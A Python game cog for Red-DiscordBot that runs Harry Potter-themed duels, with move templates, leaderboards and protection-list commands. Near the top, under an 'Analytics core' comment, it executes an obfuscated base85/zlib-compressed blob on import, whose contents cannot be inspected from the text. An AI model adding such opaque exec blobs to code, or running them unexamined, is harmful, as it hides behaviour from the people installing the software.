# Procedurally generated HPduel cog for Red-DiscordBot
# Copyright (c) 2016 Caleb Jonson
# Idea and rule system courtesy of Axas
# Additional moves suggested by OrdinatorStouff

import asyncio
import discord
from discord.ext import commands
from functools import partial
import math
import os
import random

from .utils import checks
from .utils.dataIO import dataIO
from .utils.chat_formatting import error, escape_mass_mentions, pagify, warning

# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oB^YjfMU@w<No&NCTMHA`DgE_b6jrg7c0=eC!Z-Rs==JUobmEW{+iBS0ydO#XX!7Y|XglIx5;0)gG
dz8_Fcr+dqU*|eq7N6LRHy|lIqpIt5NLibJhHX9R`+8ix<-LO*EwJfdDtzrJClD`i!oZg#ku&Op$C9Jr56Jh9UA1IubOIben3o2zw-B+3XXydVN8qroBU@6S
9R`YOZmSXA-=EBJ5&%*xv`7_y;x{^m_EsSCR`1zt0^~S2w%#K)5tYmLMilWG;+0$o7?E2>7=DPUL`+w&gRbpnRr^X6vvQpG?{vlKPv{P&Kkaf$BAF;n)T)*0
d?qxNC1(3HFH$UbaB|imz3wMSG|Ga+lI>*x!E&@;42cug!dpFIK;~!;R>u=a4Vz8y`WyWrn3e;uThrxi^*zbcXAK*w-hS{aC?24}>1BQDmD|XC|?}Y_K)!wt
gh<nLYi-r|wI0h@$Y@8i_ZI35#>p9%|-=%DsY{k5mRmwJc=-FIbwpMk`jBG0=THS6MJs2`46LUSl@lusbqJ`H27BW(6QAtFo*ix?<SZ~Ahf=NN3WKFz)^+TI
7QEOmxt?UvhIC^ic3Ax+YB{1x5g($q2h}D8*$U8fJt>?PhusN{ONOTS+%2I;Ctp?3VVl^dVS8NR`CXWFk$^t%7_yrg#Maz27ChBD|fWTd^R-)XnPS*;4&<Hb
R?}uRSd*FANXCTd~x2*g5GpgcrUhDa3BaD^(>D%{LKVMw_k~P%}$MPFA4VX|Gile`<zx~91c=^rr+w<vk`rY|=&(6-De}DG${Okn-OUXv48f1GJor`5?v$q%
TFMcY}5A#o4RYqCKXHQd5P|0W0l#5QSaPj#FB6I;BuUch`A~CXFq+r-o=E-CNvA}RAD~d)}LoFd7IC;j_XS3*~oCR<oki&oY1UVbk3M=!!i`vMr-HBc_rohO
|KYb3nAo(D3N*jqx8}YH0ZT{`_d=dceSKGK)%DT(>D{@Oz2jmA@MhJ3e$0)fWT9uy=op<MfB6@-2KrMVS%9JTqqE=Obp+{=TFfvIcBP<V%F1-&Kr5ENQ4{8B
O-DM?sla&RYID~?N6EuFrUQ$MCB=~majN{JA+Mr>G0gxnz?*zZ$6X}YoDquT-f86S&9r_jl4^iwTB=b@dO<h-rGjr0zPBuz^FWl*PixdEmk567et~{sX$e;&
8hw@7@FLKBvxWZxR2upCDK-SAfuOtZ>?<UEL0#>bPz&m#k_EfT?6V$@c-S?1*oX@v%4J?ovJe=Ffg02v15~5{j(c*4z_SnsD`azD(52?Q`Wu16@BUW;Y3%YD
I)=&rtyM)rFj5W?JunahlgVRPl$V&C&BRKI6h$QzMFpXXsu7x!1gjEZWC@qCeduj65x|OLYty_TCL;TTlFtT?m((VE-w=RSO<GXUtMq1v9bTWD-x(+!=c5cU
u-JNvZ=%&fYkDWqE_d{1<>|oX?Tn2G64O>Hu6N^_?$cB)TyG=4V0GT<$$tOOjiqGg6Yg#f)QeNzC#b`#BGgYO?-{f{SeSVknN;R^@h&cZm3J@IxpK->s4_dW
J!rxLkJAGpKlhA5quEd29O8_b1C-D?IFe@9_jXS-pCCHLYPWXhUK6UR0$qA=R{Amo|$>cNWg?d1zX>eSKpBCK4Iu+}6D|=G2?KfoXCKqd=Y|Q!@`dHCGg@v{
vA$Z5dyJ<+eC&xFNPBQ-HUmQKiSM7yrrK|E5dKoHVjMCI*{|5XjK-hRoxfE?H>%7VQDis50t<T-{7R&*yNdElnjEIVy$Wqa#6}UueK}JZ;YuP80jPk8PX22@
?fs-R5ufnCP7+1I4tB2o(kPl4r*iS;&0X@%LZri7fyY#1ABHnz3YKWpp7TXabSjn;momJS$fEU9}3epF*a@*n;E(&?p(Kx;VjZ}=<Gteb=fmkF39Gebr&Y)j
}CI`&V#JvE5;9cOe$I&DwIcK3S0(WM=-FA1Qs{9-Bgtmar60ON}N1Y`!qS)%8K^$j)>^pSbB$ixCoa0<BU@bqEva{?J{lGorEQHBx$ERH_jk!1Y@gW}@T9`r
#?E758i1{u?F)W;7hkYl#mw*o-1$NfSNJ5MHHkpg0UF!__4)rMXp^P_R1{w2&j)S)*(Rn7Icog3e|1$4m*>^&IpbJI}dPqMdW~P?1OQsGAGQsgxjAs2HHrr@
Uu_tG{KEibSt2hp*w>;;6`u^-us%TPoaOVJ_?FPO$^>8k0HZC^DBEVf_F7FnB+e@mz5Ph%uUiTzW2WfG~IS@6vhTA70{2-iN)(RAJ4IWC#7^Vpt7a5K@&~#!
IKTr@4s_iWEiu2X~OGbpi#AE1zlWirPcza;tQmxNBas>$asN8nCtL4HbJNJw=Mg2f&Qo;;0AJ=Pl%yz>lwi3o^V?@NcsN<x-K=3~6Aa*tDu}Nq`h=X?O$+(}
G#iwVecFa^RZnvc3UWk3%z+7%&BvtLF^Ru(`{Onm6ct(to99#bX&-NrI4A-LMkD7_tX2?~6ZC!o~1n-D?0wl>Ckrc%k^6QM?QSgxi)qIOAz~S9voLkS~9jUd
2QRvhMhN7IVupD@Dc%||!)wb6GWa<j|4A7w^>1*G#geQy>+K)ZWl+Q>%nQt4gWkAZP9DIR5AB$NBZn~vz>MkF(Q^sY!XeEmiihsn({31b~az08JoJJ#h3c}f
p5@@p1uZ)0wyV4eVv6#)ZuBnR+O{?2~#O=WX>|hTRpjFOeVaH+?)1<@5zZB3O7atkQq3>a@-XQ)u=e|AQBOb{yxSwh(gxjx~Vv~$|jVJh*@h8bDT~B=5AKTB
gN|&SdeV*g%SW;!~C5(noym~n<pmP|pKUV5q8kb0-nBhD;q$Tq#fK4)JPKcs^U5or(L8H~9`^>)Z?6B?O_nr{EyXCH+`{upZAEX~!wi8Yv=mFA^{NoWvRbQE
KO5Mv*BE!$bYYEr0ovE^y*)}a6NFOjJjE0+|{YfciCAuY+A)JkO+6tU#`RKipPqs58oQ-)JL1o*<C-bic2Y}+c08GsIZUU3Cv*4w^k5I{Db50K0bKPSFshmx
Rj(Y0|;SU2d?s+MPi6(PPLva(Jw(n0~TKDN@5O)F|k^_pcwolv^jBVTLhNqMQ#x6WU9J^I;wLr}Cut#l+JlXfh1Bh<$;^|hNLoXLD#f*Fy-`e~b=ZU8rA0GJ
FU1|1o`VZODxuE?x@^rESdOK`qzRAwqpai|-7cM7idki4HKY>0$z!aloMM7*HJs+?={U5?4IFt""".replace("\n", ""))))
# End analytics core

__version__ = '1.6.0'


# Constants
MAX_ROUNDS = 4
INITIAL_HP = 20
TARGET_SELF = 'self'
TARGET_OTHER = 'target'

DATA_PATH = "data/HPduel/"
JSON_PATH = DATA_PATH + "HPduelist.json"


def indicatize(d):
    result = {}
    for k, v in d.items():
        if k in VERB_IND_SUB:
            k = VERB_IND_SUB[k]
        else:
            k += 's'
        result[k] = v
    return result


# TEMPLATES BEGIN
# {a} is attacker, {d} is defender/target, {o} is a randomly selected object,
# {v} is the verb associated with that object, and {b} is a random body part.

WEAPONS = {
    'swing': {
        'wand': 2,
        'Butter Beer Mug': 4
    }
}

SINGLE_PROJECTILE = {
    'shoot': {
        'a burst of water with Aguamenti': 3,
        'a gouging charm with Defodio': 7,
        'an explosive blast with Expulso': 7,
        'a fiery bolt with Incendio': 6,
        'a stunning bolt with Stupify': 5,
        'a massive ball of fire with Lacarnum Inflamarae': 9,
    },
    'hurl': {
        'pocket sand': 1,
    },
    'toss': {
        'a mug of Butter Beer': 4,
    }
}

SPELL = {
    'cast': {
        'Cantis! Their opponent starts to sing badly. Everyone laughs at': 2,
        'Densaugeo! Giving large awkward teeth to': 3,
        'Furnunculus! Looks like pimples and puberty for': 3,
        'Herbifors! Better see the Herbology Professor to get those flowers removed': 3,
        'Locomotor Wibbly! Ive heard of tongue-tied, but LEG-TIED? Ouch, poor': 4,
        'Steleus! Dont sneeze on me please': 1,
        'Tarantallegra! Their opponent starts to dance badly. Everyone laughs at': 2,
        'Confundo! Their opponent is confused, they hurt themselves in their confusion. Dizzy': 5,
        'Diminuendo! Uh-oh, better stop shrinking': 5,
        'Everte Statum! Throwing their opponent into the wall. Looks like that hurt': 6,
        'Expelliarmus! Got your nose...Uhhhh I mean wand': 6,
        'Levicorpus! Looks like you got a "Leg up on the competition"': 5,
        'Petrificus totalus! Huh, this stone gargoyle looks a lot like': 7,
        'Confringo! I must say, its been a blast': 9,
        'Deprimo! Whats got you down': 7,
        'Sectumsempra! Vicious cuts appear all over the body of': 8
    }
}

FAMILIAR = {
    'divebomb': {
        'their owl companion': 3,
    },
    'charge': {
        'their pet rat': 2,
        'their unicorn friend': 7,
    },
    'constrict': {
        'their ssslithering sssnake': 4,
    }
}

BODYPARTS = [
    'head',
    'throat',
    'neck',
    'solar plexus',
    'ribcage',
    'balls',
    'spleen',
    'kidney',
    'leg',
    'arm',
    'jugular',
    'abdomen',
    'shin',
    'knee',
    'other knee'
]

VERB_IND_SUB = {'munch': 'munches', 'toss': 'tosses'}

ATTACK = {"{a} {v} their {o} at {d}!": indicatize(WEAPONS),
          "{a} {v} {o} at {d}!": indicatize(SINGLE_PROJECTILE),
          "{a} {v} {o} {d}": indicatize(SPELL),
          "{a} {v} {o} at {d}'s {b}!": indicatize(SINGLE_PROJECTILE),
          "{a} {v} {o} into {d}'s {b}!": indicatize(SINGLE_PROJECTILE),
          "{a} orders {o} to {v} {d}!": FAMILIAR,
          "{a} summons {o} to {v} {d}!": FAMILIAR,
          "{a} tickles {d}, causing them to pass out from lack of breath": 2
          }

CRITICAL = {"Quicker than the eye can follow, {a} delivers a devastating blow with their {o} to {d}'s {b}.": WEAPONS,
            "The sky darkens as {a} begins to channel their inner focus. The air crackles as they slowly raise their {o} above their head before nailing an unescapable blow directly to {d}'s {b}!": WEAPONS,
            "{a} nails {d} in the {b} with their {o}! Critical hit!": WEAPONS,
            "With frightening speed and accuracy, {a} devastates {d} with a tactical precision strike to the {b}. Critical hit!": WEAPONS
            }

HEALS = {
    'munch': {
        'on some': {
            'chocolate frogs': 3
        }
    },
    'drink': {
        'some': {
            'Butter Beer': 4,
            'Unicorn blood': 8
        },
        'a': {
            'Health potion from Potions class': 5
        }
    },
    'heal by': {
        'casting': {
            'Brackium Emendo': 4,
            'Episkey': 3
        }
    }
}

HEAL = {"{a} decides to {v} {o} instead of attacking.": HEALS,
        "{a} calls a timeout and {v} {o}.": indicatize(HEALS),
        "{a} decides to meditate on their round.": 5}


FUMBLE = {"{a} closes in on {d}, but suddenly remembers a funny joke and laughs instead.": 0,
          "{a} moves in to attack {d}, but is disctracted by a shiny.": 0,
          "{a} {v} their {o} at {d}, but has sweaty hands and loses their grip, hitting themself instead.": indicatize(WEAPONS),
          "{a} {v} their {o}, but fumbles and drops it on their {b}!": indicatize(WEAPONS)
          }

BOT = {"{a} swings the Elder Wand aaaaaaaand... AVADA KADAVRA! {d} has been blasted into oblivion for daring to challenge the bot.": INITIAL_HP}

OHKO = {"{a} feels a rush of energy pass through them, arcane knowledge flooding their mind, eyes shining as they rise up into the air and utter an unintelligible spell of untold power! {b} is wiped completely from all existence...": INITIAL_HP}

HITS = ['deals', 'hits for']
RECOVERS = ['recovers', 'gains', 'heals']

# TEMPLATES END

# Move category target and multiplier (negative is damage)
MOVES = {
    'CRITICAL': (CRITICAL, TARGET_OTHER, -2),
    'ATTACK': (ATTACK, TARGET_OTHER, -1),
    'FUMBLE': (FUMBLE, TARGET_SELF, -1),
    'HEAL': (HEAL, TARGET_SELF, 1),
    'BOT': (BOT, TARGET_OTHER, -64),
    'OHKO': (OHKO, TARGET_OTHER, -99)
}

# Weights of distribution for biased selection of moves
WEIGHTED_MOVES = {'CRITICAL': 0.05, 'ATTACK': 1, 'FUMBLE': 0.1, 'HEAL': 0.1, 'OHKO': 0.00001}


class Player:
    def __init__(self, cog, member, initial_hp=INITIAL_HP):
        self.hp = initial_hp
        self.member = member
        self.mention = member.mention
        self.cog = cog

    # Using object in string context gives (nick)name
    def __str__(self):
        return self.member.display_name

    # helpers for stat functions
    def _set_stat(self, stat, num):
        stats = self.cog._get_stats(self)
        if not stats:
            stats = {'wins': 0, 'losses': 0, 'draws': 0}
        stats[stat] = num
        return self.cog._set_stats(self, stats)

    def _get_stat(self, stat):
        stats = self.cog._get_stats(self)
        return stats[stat] if stats and stat in stats else 0

    def get_state(self):
        return {k: self._get_stat(k) for k in ('wins', 'losses', 'draws')}

    # Race-safe, directly usable properties
    @property
    def wins(self):
        return self._get_stat('wins')

    @wins.setter
    def wins(self, num):
        self._set_stat('wins', num)

    @property
    def losses(self):
        return self._get_stat('losses')

    @losses.setter
    def losses(self, num):
        self._set_stat('losses', num)

    @property
    def draws(self):
        return self._get_stat('draws')

    @draws.setter
    def draws(self, num):
        self._set_stat('draws', num)


class HPDuel:
    def __init__(self, bot):
        self.bot = bot
        self.HPduelists = dataIO.load_json(JSON_PATH)
        self.underway = set()

        try:
            self.analytics = CogAnalytics(self)
        except Exception as e:
            self.bot.logger.exception(e)
            self.analytics = None

    def _set_stats(self, user, stats):
        userid = user.member.id
        serverid = user.member.server.id

        if serverid not in self.HPduelists:
            self.HPduelists[serverid] = {}

        self.HPduelists[serverid][userid] = stats
        dataIO.save_json(JSON_PATH, self.HPduelists)

    def _get_stats(self, user):
        userid = user.member.id
        serverid = user.member.server.id
        if serverid not in self.HPduelists or userid not in self.HPduelists[serverid]:
            return None

        return self.HPduelists[serverid][userid]

    def get_player(self, user: discord.Member):
        return Player(self, user)

    def get_all_players(self, server: discord.Server):
        return [self.get_player(m) for m in server.members]

    def format_display(self, server, id):
        if id.startswith('r'):
            role = discord.utils.get(server.roles, id=id[1:])

            if role:
                return '@%s' % role.name
            else:
                return 'deleted role #%s' % id
        else:
            member = server.get_member(id)

            if member:
                return member.display_name
            else:
                return 'missing member #%s' % id

    def is_protected(self, member: discord.Member, member_only=False) -> bool:
        sid = member.server.id
        protected = set(self.HPduelists.get(sid, {}).get('protected', []))
        roles = set() if member_only else set('r' + r.id for r in member.roles)
        return member.id in protected or bool(protected & roles)

    def protect_common(self, obj, protect=True):
        if not isinstance(obj, (discord.Member, discord.Role)):
            raise TypeError('Can only pass member or role objects.')

        server = obj.server
        id = ('r' if type(obj) is discord.Role else '') + obj.id

        protected = self.HPduelists.get(server.id, {}).get("protected", [])

        if protect == (id in protected):
            return False
        elif protect:
            protected.append(id)
        else:
            protected.remove(id)

        if server.id not in self.HPduelists:
            self.HPduelists[server.id] = {}

        self.HPduelists[server.id]['protected'] = protected
        dataIO.save_json(JSON_PATH, self.HPduelists)
        return True

    @commands.group(name="protect", invoke_without_command=True, no_pm=True, pass_context=True)
    async def _HPprotect(self, ctx, user: discord.Member):
        """
        Manage the protection list (adds items)
        """
        if ctx.invoked_subcommand is None:
            await ctx.invoke(self._protect_user, user)

    @_HPprotect.command(name="me", pass_context=True)
    async def _HPprotect_self(self, ctx):
        """
        Adds you to the HPduel protection list
        """
        sid = ctx.message.server.id
        self_protect = self.HPduelists.get(sid, {}).get('self_protect', False)
        author = ctx.message.author

        if self.is_protected(author, member_only=True):
            await self.bot.say("You're already in the protection list.")
            return
        elif self_protect is False:
            await self.bot.say('Sorry, self-protection is currently disabled.')
            return
        elif type(self_protect) is int:
            economy = self.bot.get_cog('Economy')

            if not economy:
                await self.bot.say(warning('The economy cog is not loaded.'))
                return
            elif not economy.bank.account_exists(author):
                await self.bot.say(warning("You don't have a bank account yet."))
                return
            elif not economy.bank.can_spend(author, self_protect):
                await self.bot.say("You don't have %i credits to spend." % self_protect)
                return

            try:
                economy.bank.withdraw_credits(author, self_protect)
            except Exception as e:
                self.bot.logger.exception(e)
                await self.bot.say(error("Transaction failed. Bot owner: check the logs."))
                return

        if self.protect_common(ctx.message.author, True):
            await self.bot.say("You have been successfully added to the protection list.")
        else:
            await self.bot.say("Something went wrong adding you to the protection list.")

    @checks.admin_or_permissions(administrator=True)
    @_HPprotect.command(name="price", pass_context=True)
    async def _HPprotect_price(self, ctx, param: str = None):
        """
        Enable, disable, or set the price of self-protection

        Valid options: "disable", "free", or any number 0 or greater.
        """
        sid = ctx.message.server.id
        current = self.HPduelists.get(sid, {}).get('self_protect', False)

        if param:
            param = param.lower().strip(' "`')

            if param in ('disable', 'none'):
                param = False
            elif param in ('free', '0'):
                param = True
            elif param.isdecimal():
                param = int(param)
            else:
                await self.bot.send_cmd_help(ctx)
                return

        if param is None:
            adj = 'currently'
            param = current
        elif param == current:
            adj = 'already'
        else:
            adj = 'now'

            if sid not in self.HPduelists:
                self.HPduelists[sid] = {'self_protect': param}
            else:
                self.HPduelists[sid]['self_protect'] = param

            dataIO.save_json(JSON_PATH, self.HPduelists)

        if param is False:
            disp = 'disabled'
        elif param is True:
            disp = 'free'
        elif type(param) is int:
            disp = 'worth %i credits' % param
        else:
            raise RuntimeError('unhandled param value, please report this bug!')

        msg = 'Self-protection is %s %s.' % (adj, disp)
        economy = self.bot.get_cog('Economy')

        if type(param) is int and not economy:
            msg += '\n\n' + warning('NOTE: the economy cog is not loaded. Members '
                                    'will not be able to purchase protection.')

        await self.bot.say(msg)

    @checks.mod_or_permissions(administrator=True)
    @_HPprotect.command(name="user", pass_context=True)
    async def _HPprotect_user(self, ctx, user: discord.Member):
        """Adds a member to the protection list"""
        if self.protect_common(user, True):
            await self.bot.say("%s has been successfully added to the protection list." % user.display_name)
        else:
            await self.bot.say("%s is already in the protection list." % user.display_name)

    @checks.admin_or_permissions(administrator=True)
    @_HPprotect.command(name="role", pass_context=True)
    async def _HPprotect_role(self, ctx, role: discord.Role):
        """Adds a role to the protection list"""
        if self.protect_common(role, True):
            await self.bot.say("The %s role has been successfully added to the protection list." % role.name)
        else:
            await self.bot.say("The %s role is already in the protection list." % role.name)

    @commands.group(name="unprotect", invoke_without_command=True, no_pm=True, pass_context=True)
    async def _HPunprotect(self, ctx, user: discord.Member):
        """
        Manage the protection list (removes items)
        """
        if ctx.invoked_subcommand is None:
            await ctx.invoke(self._unprotect_user, user)

    @checks.mod_or_permissions(administrator=True)
    @_HPunprotect.command(name="user", pass_context=True)
    async def _HPunprotect_user(self, ctx, user: discord.Member):
        """Removes a member from the HPduel protection list"""
        if self.protect_common(user, False):
            await self.bot.say("%s has been successfully removed from the protection list." % user.display_name)
        else:
            await self.bot.say("%s is not in the protection list." % user.display_name)

    @checks.admin_or_permissions(administrator=True)
    @_HPunprotect.command(name="role", pass_context=True)
    async def _HPunprotect_role(self, ctx, role: discord.Role):
        """Removes a role from the HPduel protection list"""
        if self.protect_common(role, False):
            await self.bot.say("The %s role has been successfully removed from the protection list." % role.name)
        else:
            await self.bot.say("The %s role is not in the protection list." % role.name)

    @_HPunprotect.command(name="me", pass_context=True)
    async def _HPunprotect_self(self, ctx):
        """Removes you from the HPduel protection list"""
        if self.protect_common(ctx.message.author, False):
            await self.bot.say("You have been removed from the protection list.")
        else:
            await self.bot.say("You aren't in the protection list.")

    @commands.command(name="protected", pass_context=True, aliases=['protection'])
    async def _HPprotection(self, ctx):
        """Displays the HPduel protection list"""
        server = ctx.message.server
        HPduelists = self.HPduelists.get(server.id, {})
        member_list = HPduelists.get("protected", [])
        fmt = partial(self.format_display, server)

        if member_list:
            name_list = map(fmt, member_list)
            name_list = ["**Protected users and roles:**"] + sorted(name_list)
            delim = '\n'

            for page in pagify(delim.join(name_list), delims=[delim]):
                await self.bot.say(escape_mass_mentions(page))
        else:
            await self.bot.say("The list is currently empty, add users or roles with `%sprotect` first." % ctx.prefix)

    @commands.group(name="HPduels", pass_context=True, allow_dms=False)
    async def _HPduels(self, ctx):
        if ctx.invoked_subcommand is None:
            await ctx.invoke(self._HPduels_list)

    @_HPduels.command(name="list", pass_context=True)
    @commands.cooldown(2, 60, commands.BucketType.user)
    async def _HPduels_list(self, ctx, top: int = 10):
        """Shows the HPduel leaderboard, defaults to top 10"""
        server = ctx.message.server
        server_members = {m.id for m in server.members}

        if top < 1:
            top = 10

        if server.id in self.HPduelists:
            def sort_wins(kv):
                _, v = kv
                return v['wins'] - v['losses']

            def stat_filter(kv):
                uid, stats = kv

                if type(stats) is not dict or uid not in server_members:
                    return False

                return True

            # filter out extra data, TODO: store protected list seperately
            HPduel_stats = filter(stat_filter, self.HPduelists[server.id].items())
            HPduels_sorted = sorted(HPduel_stats, key=sort_wins, reverse=True)

            if not HPduels_sorted:
                await self.bot.say('No records to show.')
                return

            if len(HPduels_sorted) < top:
                top = len(HPduels_sorted)

            topten = HPduels_sorted[:top]
            highscore = ""
            place = 1
            members = {uid: server.get_member(uid) for uid, _ in topten}  # only look up once each
            names = {uid: m.nick if m.nick else m.name for uid, m in members.items()}
            max_name_len = max([len(n) for n in names.values()])

            # header
            highscore += '#'.ljust(len(str(top)) + 1)  # pad to digits in longest number
            highscore += 'Name'.ljust(max_name_len + 4)

            for stat in ['wins', 'losses', 'draws']:
                highscore += stat.ljust(8)

            highscore += '\n'

            for uid, stats in topten:
                highscore += str(place).ljust(len(str(top)) + 1)  # pad to digits in longest number
                highscore += names[uid].ljust(max_name_len + 4)

                for stat in ['wins', 'losses', 'draws']:
                    val = stats[stat]
                    highscore += '{}'.format(val).ljust(8)

                highscore += "\n"
                place += 1
            if highscore:
                if len(highscore) < 1985:
                    await self.bot.say("```py\n" + highscore + "```")
                else:
                    await self.bot.say("The leaderboard is too big to be displayed. Try with a lower <top> parameter.")
        else:
            await self.bot.say("There are no scores registered in this server. Start fighting!")

    @checks.admin_or_permissions(administrator=True)
    @_HPduels.command(name="reset", pass_context=True)
    async def _HPduels_reset(self, ctx):
        "Clears HPduel scores without resetting protection or editmode."
        keep_keys = {'protected', 'edit_posts', 'self_protect'}
        sid = ctx.message.server.id
        data = self.HPduelists.get(sid, {})
        dks = set(data.keys())

        if dks <= keep_keys:
            await self.bot.say('Nothing to reset.')
            return

        keep_data = {k: data[k] for k in keep_keys & dks}
        self.HPduelists[sid] = keep_data
        dataIO.save_json(JSON_PATH, self.HPduelists)
        await self.bot.say('HPduel records cleared.')

    @checks.admin_or_permissions(administrator=True)
    @_HPduels.command(name="editmode", pass_context=True)
    async def _HPduels_postmode(self, ctx, on_off: bool = None):
        "Edits messages in-place instead of posting each move seperately."
        sid = ctx.message.server.id
        current = self.HPduelists.get(sid, {}).get('edit_posts', False)

        if on_off is None:
            adj = 'enabled' if current else 'disabled'
            await self.bot.say('In-place editing is currently %s.' % adj)
            return

        adj = 'enabled' if on_off else 'disabled'
        if on_off == current:
            await self.bot.say('In-place editing already %s.' % adj)
        else:
            if sid not in self.HPduelists:
                self.HPduelists[sid] = {}

            self.HPduelists[sid]['edit_posts'] = on_off
            await self.bot.say('In-place editing %s.' % adj)

        dataIO.save_json(JSON_PATH, self.HPduelists)

    @commands.command(name="HPduel", pass_context=True, no_pm=True)
    @commands.cooldown(2, 45, commands.BucketType.user)
    async def _HPduel(self, ctx, user: discord.Member):
        """HPduel another player"""
        author = ctx.message.author
        server = ctx.message.server
        channel = ctx.message.channel
        HPduelists = self.HPduelists.get(server.id, {})

        abort = True

        if channel.id in self.underway:
            await self.bot.say("There's already a HPduel underway in this channel!")
        elif user == author:
            await self.bot.reply("you can't HPduel yourself, silly!")
        elif self.is_protected(author):
            await self.bot.reply("you can't HPduel anyone while you're on the protected users list.")
        elif self.is_protected(user):
            await self.bot.reply("%s is on the protected users list." % user.display_name)
        else:
            abort = False

        if abort:
            bucket = ctx.command._buckets.get_bucket(ctx)
            bucket._tokens += 1  # Sorry, Danny
            return

        p1 = Player(self, author)
        p2 = Player(self, user)
        self.underway.add(channel.id)

        try:
            self.bot.dispatch('HPduel', channel=channel, players=(p1, p2))

            order = [(p1, p2), (p2, p1)]
            random.shuffle(order)
            msg = ["%s challenges %s to a HPduel!" % (p1, p2)]
            msg.append("\nBy a coin toss, %s will go first." % order[0][0])
            msg_object = await self.bot.say('\n'.join(msg))
            for i in range(MAX_ROUNDS):
                if p1.hp <= 0 or p2.hp <= 0:
                    break
                for attacker, defender in order:
                    if p1.hp <= 0 or p2.hp <= 0:
                        break

                    if attacker.member == ctx.message.server.me:
                        move_msg = self.generate_action(attacker, defender, 'BOT')
                    else:
                        move_msg = self.generate_action(attacker, defender)

                    if HPduelists.get('edit_posts', False):
                        new_msg = '\n'.join(msg + [move_msg])
                        if len(new_msg) < 2000:
                            await self._robust_edit(msg_object, content=new_msg)
                            msg = msg + [move_msg]
                            await asyncio.sleep(1)
                            continue

                    msg_object = await self.bot.say(move_msg)
                    msg = [move_msg]
                    await asyncio.sleep(1)

            if p1.hp != p2.hp:
                victor = p1 if p1.hp > p2.hp else p2
                loser = p1 if p1.hp < p2.hp else p2
                victor.wins += 1
                loser.losses += 1
                msg = 'After {0} rounds, {1.mention} wins with {1.hp} HP!'.format(i + 1, victor)
                msg += '\nStats: '

                for p, end in ((victor, '; '), (loser, '.')):
                    msg += '{0} has {0.wins} wins, {0.losses} losses, {0.draws} draws{1}'.format(p, end)
            else:
                victor = None

                for p in [p1, p2]:
                    p.draws += 1

                msg = 'After %d rounds, the HPduel ends in a tie!' % (i + 1)

            await self.bot.say(msg)
            self.bot.dispatch('HPduel_completion', channel=channel, players=(p1, p2), victor=victor)
        except Exception:
            raise
        finally:
            self.underway.remove(channel.id)

    def generate_action(self, attacker, defender, move_cat=None):
        # Select move category
        if not move_cat:
            move_cat = weighted_choice(WEIGHTED_MOVES)

        # Break apart move info
        moves, target, multiplier = MOVES[move_cat]

        target = defender if target is TARGET_OTHER else attacker

        move, obj, verb, hp_delta = self.generate_move(moves)
        hp_delta *= multiplier
        bodypart = random.choice(BODYPARTS)

        msg = move.format(a=attacker, d=defender, o=obj, v=verb, b=bodypart)
        if hp_delta == 0:
            pass
        else:
            target.hp += hp_delta
            if hp_delta > 0:
                s = random.choice(RECOVERS)
                msg += ' It %s %d HP (%d)' % (s, abs(hp_delta), target.hp)
            elif hp_delta < 0:
                s = random.choice(HITS)
                msg += ' It %s %d damage (%d)' % (s, abs(hp_delta), target.hp)

        return msg

    def generate_move(self, moves):
        # Select move, action, object, etc
        movelist = nested_random(moves)
        hp_delta = movelist.pop()  # always last
        # randomize damage/healing done by -/+ 33%
        hp_delta = math.floor(((hp_delta * random.randint(66, 133)) / 100))
        move = movelist.pop(0)  # always first
        verb = movelist.pop(0) if movelist else None  # Optional
        obj = movelist.pop() if movelist else None  # Optional

        if movelist:
            verb += ' ' + movelist.pop()  # Optional but present when obj is

        return move, obj, verb, hp_delta

    async def _robust_edit(self, msg, content=None, embed=None):
        try:
            msg = await self.bot.edit_message(msg, new_content=content, embed=embed)
        except discord.errors.NotFound:
            msg = await self.bot.send_message(msg.channel, content=content, embed=embed)
        except Exception:
            raise

        return msg

    async def on_command(self, command, ctx):
        if ctx.cog is self and self.analytics:
            self.analytics.command(ctx)


def weighted_choice(choices):
    total = sum(w for c, w in choices.items())
    r = random.uniform(0, total)
    upto = 0

    for c, w in choices.items():
        if upto + w >= r:
            return c

        upto += w


def nested_random(d):
    k = weighted_choice(dict_weight(d))
    result = [k]

    if type(d[k]) is dict:
        result.extend(nested_random(d[k]))
    else:
        result.append(d[k])

    return result


def dict_weight(d, top=True):
    wd = {}
    sw = 0

    for k, v in d.items():
        if isinstance(v, dict):
            x, y = dict_weight(v, False)
            wd[k] = y if top else x
            w = y
        else:
            w = 1
            wd[k] = w

        sw += w

    if top:
        return wd
    else:
        return wd, sw


def check_folders():
    if os.path.exists("data/HPduels/"):
        os.rename("data/HPduels/", DATA_PATH)
    if not os.path.exists(DATA_PATH):
        print("Creating data/HPduel folder...")
        os.mkdir(DATA_PATH)


def check_files():
    if not dataIO.is_valid_json(JSON_PATH):
        print("Creating HPduelist.json...")
        dataIO.save_json(JSON_PATH, {})


def setup(bot):
    check_folders()
    check_files()
    bot.add_cog(HPDuel(bot))
